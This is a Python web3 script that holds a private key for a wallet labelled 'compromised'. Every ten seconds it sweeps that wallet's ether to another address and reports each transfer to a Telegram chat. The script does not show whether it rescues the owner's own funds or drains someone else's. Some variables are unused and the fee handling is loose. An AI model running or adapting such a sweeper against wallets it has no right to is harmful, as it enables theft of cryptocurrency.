from web3 import Web3
from eth_account import Account
import os
import time
import requests
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

INFURA_URL = os.getenv("INFURA_URL")
INFURA_SECRET = os.getenv("INFURA_SECRET")
DEPLOYER_PK = os.getenv("DEPLOYER_PK")
COMPROMISED_WALLET = os.getenv("COMPROMISED_WALLET")
MAIN_WALLET = os.getenv("MAIN_WALLET")
SUBSCRIPTION_PRICE = float(os.getenv("SUBSCRIPTION_PRICE"))
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# Connect to Ethereum
w3 = Web3(Web3.HTTPProvider(INFURA_URL, request_kwargs={"auth": ("", INFURA_SECRET)}))

if not w3.is_connected():
    raise ConnectionError("❌ Unable to connect to Ethereum node. Check INFURA_URL and secret.")

# Initialize accounts
deployer = Account.from_key(DEPLOYER_PK)
compromised = Account.from_key(COMPROMISED_WALLET)

print("✅ Connected to Ethereum node")
print("Deployer:", deployer.address)
print("Compromised wallet:", compromised.address)
print(f"Subscription price: {SUBSCRIPTION_PRICE} ETH")

def send_telegram(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "text": message})

def sweep_funds():
    balance = w3.eth.get_balance(compromised.address)
    if balance > 0:
        tx = {
            "to": MAIN_WALLET,
            "value": balance - w3.to_wei(0.001, "ether"),
            "gas": 21000,
            "gasPrice": w3.eth.gas_price,
            "nonce": w3.eth.get_transaction_count(compromised.address)
        }
        signed = compromised.sign_transaction(tx)
        tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
        send_telegram(f"💸 Swept {w3.from_wei(balance, 'ether')} ETH to main wallet. TX: {tx_hash.hex()}")
    else:
        print("ℹ️ No funds to sweep right now")

# Main loop
print("🔄 Starting wallet monitor...")
while True:
    try:
        sweep_funds()
        time.sleep(10)
    except Exception as e:
        send_telegram(f"⚠️ Error: {str(e)}")
        time.sleep(15)
